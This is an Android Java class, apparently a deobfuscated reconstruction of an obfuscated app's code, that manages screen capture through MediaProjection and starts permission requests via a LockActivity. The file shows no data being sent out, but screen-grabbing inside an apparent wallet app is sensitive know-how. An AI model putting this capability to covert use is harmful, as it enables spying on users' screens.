package com.guard.wallet.capture;

import com.guard.wallet.core.AppUtils;
import android.hardware.display.VirtualDisplay;
import android.content.Intent;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.os.Handler;
import android.os.Looper;
import android.view.Surface;
import com.guard.wallet.LockActivity;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.utils.DeviceUtils;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.locks.ReentrantLock;

/**
 * 屏幕捕获管理器 -- VirtualDisplay + MediaProjection 截屏核心。
 * 管理 MediaProjection / VirtualDisplay / ImageReader 生命周期，
 * 提供单例访问和线程安全的锁控制。
 *
 * vendor 原始路径: x/a.java (109 行)
 */
public final class ScreenCaptureManager {

    /** 单例实例 */
    public static ScreenCaptureManager instance = new ScreenCaptureManager();

    /** ImageReader -- 接收 VirtualDisplay 帧 */
    public ImageReader imageReader;
    /** MediaProjection -- 录屏投影 */
    public MediaProjection projection;
    /** VirtualDisplay -- 虚拟显示器 */
    public VirtualDisplay virtualDisplay;
    /** 投影配置锁 (setup / teardown) */
    public final ReentrantLock setupLock = new ReentrantLock();
    /** 截图读取锁 (callers grab this to read the latest bitmap) */
    public final ReentrantLock readLock = new ReentrantLock();
    /** 是否正在请求投影权限 */
    public final AtomicBoolean requesting = new AtomicBoolean(false);
    /** 图片帧监听器 */
    public final ScreenImageListener imageListener = new ScreenImageListener();

    /**
     * 创建 VirtualDisplay（静态工厂方法）。
     * vendor: static VirtualDisplay a(MediaProjection, Surface)
     */
    public static VirtualDisplay createVirtualDisplay(MediaProjection mp, Surface surface) {
        ScreenMetricsVO metrics = com.guard.wallet.utils.DeviceUtils.buildScreenMetrics();
        return mp.createVirtualDisplay("ScreenCapture",
                metrics.getWidth(), metrics.getHeight(), metrics.getDensity(),
                18, surface, new VirtualDisplayCallback(), getHandler());
    }

    /**
     * 获取单例。
     * vendor: static a b()
     */
    public static ScreenCaptureManager getInstance() {
        if (instance == null) {
            instance = new ScreenCaptureManager();
        }
        return instance;
    }

    /**
     * 获取当前线程 Handler（如无 Looper 则 prepare）。
     * vendor: static Handler d()
     */
    public static Handler getHandler() {
        if (Looper.myLooper() == null) {
            Looper.prepare();
        }
        Looper looper = Looper.myLooper();
        return looper != null ? new Handler(looper) : new Handler(Looper.getMainLooper());
    }

    /**
     * 判断捕获链是否就绪（projection + virtualDisplay + imageReader 全部非空）。
     * vendor: boolean c()
     */
    public final boolean isReady() {
        return this.projection != null && this.virtualDisplay != null && this.imageReader != null;
    }

    /**
     * 请求屏幕投影权限（启动 LockActivity 申请）。
     * vendor: void f()
     */
    public final void requestProjection() {
        try {
            LockActivity activity = LockActivity.b();
            if (activity != null) {
                activity.d();
                return;
            }
            if (MainApplication.getAppContext() == null) {
                return;
            }
            Intent intent = new Intent(MainApplication.getAppContext(), LockActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                    | Intent.FLAG_ACTIVITY_SINGLE_TOP
                    | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            intent.putExtra("request_media_projection", true);
            MainApplication.getAppContext().startActivity(intent);
        } catch (Exception ex) {
            AppUtils.s("ScreenCaptureManager", ex);
        }
    }

    /**
     * 处理投影结果 -- 用 activity result data 创建 MediaProjection（pre-API 29 路径）。
     * vendor: void g(Intent)
     */
    public final void handleProjectionResult(Intent data) {
        try {
            if (data == null || MainApplication.getAppContext() == null) return;
            android.media.projection.MediaProjectionManager mpm =
                    (android.media.projection.MediaProjectionManager)
                            MainApplication.getAppContext().getSystemService("media_projection");
            if (mpm == null) return;
            this.projection = mpm.getMediaProjection(-1, data);
        } catch (Exception ex) {
            AppUtils.s("ScreenCaptureManager", ex);
        }
    }

    /**
     * 释放全部捕获资源（projection + virtualDisplay + imageReader）。
     * vendor: void e()
     */
    public final void release() {
        MediaProjection mp = this.projection;
        if (mp != null) {
            mp.stop();
            this.projection = null;
        }
        VirtualDisplay vd = this.virtualDisplay;
        if (vd != null) {
            vd.release();
            this.virtualDisplay = null;
        }
        ImageReader ir = this.imageReader;
        if (ir != null) {
            ir.close();
            this.imageReader = null;
        }
    }
}
